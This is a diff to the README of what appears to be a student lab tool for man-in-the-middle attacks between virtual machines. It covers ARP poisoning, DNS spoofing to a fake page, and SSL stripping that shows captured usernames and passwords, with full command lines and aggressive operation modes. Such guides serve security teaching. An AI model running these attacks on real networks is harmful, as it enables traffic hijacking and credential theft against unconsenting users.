@@ -49,29 +49,23 @@ Note: If you want to run 2 VMs on 2 seperate devices, NAT or Host-only adapter m
 - `sudo apt install python3-scapy`
 - `sudo apt install wireshark`
 
-### Step 4 - Enable IP fowarding (Attacker VM)
 
-- `sudo sysctl -w net.ipv4.ip_forward=1`
-- Verify: `cat /proc/sys/net/ipv4/ip_forward`
-- Output must be: 1
-
-### Step 5: Find gateway IP
+### Step 4: Find gateway IP
 
 - On Attacker VM: `ip route`
 - Look for the default gateway line and note the **Gateway IP**
 
-### Step 6: Start Wireshark
+### Step 5: Start Wireshark
 
 1. Open Wireshark
 2. Select interface ens33
 3. Select capture
-4. Apply filter: _arp_
 
 # Attack Modes
 
 The tool works in three modes. All commands must be run with `sudo` permissons.
 
-## Mode A: ARP Spoofing Attack
+## Mode A: ARP Poisoning Attack
 
 ### Step 1: Running the attack
 
@@ -100,18 +94,19 @@ Redirects the victim to a fake website whjen they try to visit a specific domain
 
 On Attacker VM:
 
-- `echo "<h1>YOU HAVE BEEN HACKED</h1>" > index.html` to create the fake webpage.
+- `echo "<h1>{ENTER_TEXT}</h1>" > index.html` to create a fake webpage to be redirected.
 - `sudo python3 -m http.server 80` start the server on port 80.
   Keep the terminal open at Attacker VM. When it show log entries "GET / HTTP/1.1" 200, it means the victim is connected.
 
-### Step 2: Run the DNS poisoning attack
+### Step 2: Run the DNS sppofing attack
 
 On Attacker VM:
 
 1. Open a new terminal.
 2. Navigate to the folder containing the scripts.
 3. `sudo python3 main.py --mode dns --victim <VICTIM_IP> --gateway <GATEWAY_IP> --attacker <ATTACKER_IP> --target-domain <www.example.com> --op-mode <silent|allout|default>` to run the tool.
-4. Verify the output:
+4. Target Domain is `www.tue.nl` by default.
+5. Verify the output:
 
 - "[+] Arp Spoofing started..." and
 - "[+] DNS Sniffer started..."
@@ -120,16 +115,16 @@ On Attacker VM:
 
 On Victim VM:
 
-1. `sudo resolvectl flush-caches` to clear the DNS cahce before testing.(Must clear it befor testing)
+1. `sudo resolvectl flush-caches` to clear the DNS cahce before testing. (Must clear it before testing)
 2. Test:
 
 - OPTION A
   - `ping <TARGET_DOMAIN>`
-    After pingin the taget domain from Victim VM, if the response is coming from <ATTACKER_IP>, it means attack succeeded.
+    After pinging the target domain from Victim VM, if the response is coming from <ATTACKER_IP>, it means attack succeeded.
 - OPTION B
   - Open Firefox and visit http://<TARGET_DOMAIN>
-  - You should see the "YOU HAVE BEEN HACKED" page.
-    Note: Use HTTP not HTTPS because at this point of our attack we have not set up SSL Stripping yet.
+  - You should see the webpage that you created from the Attacker machine.
+    Note: Use HTTP not HTTPS.
 
 ## Mode C: SSL Stripping
 
@@ -142,18 +137,21 @@ Downgrades HTTPS connections to HTTP to steal credientials
 3. `sudo python3 main.py --mode ssl --victim <VICTIM_IP> --gateway <GATEWAY_IP> --interface <INTERFACE_NAME> --op-mode <silent|allout|default>` to run the tool.
 4. Verify the output: "[+] Starting SSL Stripping on <INTERFACE_NAME>"
 
-### Step 2: Test the Attack ():
+### Step 2: Test the Attack:
 
 On Victim VM:
 
 - OPTION A
-  - `curl -I -L http://testphp.vulnweb.com/login.php`
-  - Success: Output shows `HTTP/1.1 200 OK` and No `Strict-Transport-Secuirty` header present.
+  - `curl -I -L http://testphp.vulnweb.com/login.php` (or any non-HSTS website)
+  - Success: Output shows `HTTP/1.1 200 OK` and No `Strict-Transport-Secuirty` header present .
 - OPTION B
   - Open browser on Victim VM
   - Go to `http://testphp.vulnweb.com/login.php` (or any non-HSTS website)
   - Enter a username and password
   - Success: Check the attacker terminal. You will see the raw username and password you entered
+
+
+**Note:** SSL Stripping is **ineffective** against websites that enforce **HTTP Strict Transport Security (HSTS)**. HSTS instructs browsers to automatically refuse insecure HTTP connections, which prevents the tool from downgrading the link.
 
 ## Operational Modes
 
@@ -178,6 +176,15 @@ Designed for maximum impact and ensuring interception even on busy networks.
 - **DNS:** Wildcard spoofing. Redirects **ALL** DNS queries from the victim to the attacker, regardless of the domain requested.
 - **SSL:** Active SSL Stripping. Forces HTTPS connections down to HTTP using `NFQUEUE` and attempts to bypass HSTS headers.
 - **Output:** Verbose console output showing all intercepted headers, modifications, and traffic details.
+
+### 3. Default Mode
+
+This is the default operation mode which the attack runs if no specific operation mode is selected.
+
+- **ARP:** Medium frequency flooding (every 2 seconds)
+- **DNS:** Only spoofs the specific targer domain provided
+- **SSL:** Active SSL stripping.
+- **Output:** Verbose console output showing all intercepted hearders, modifications, and traffic details.
 
 ### Notes:
 
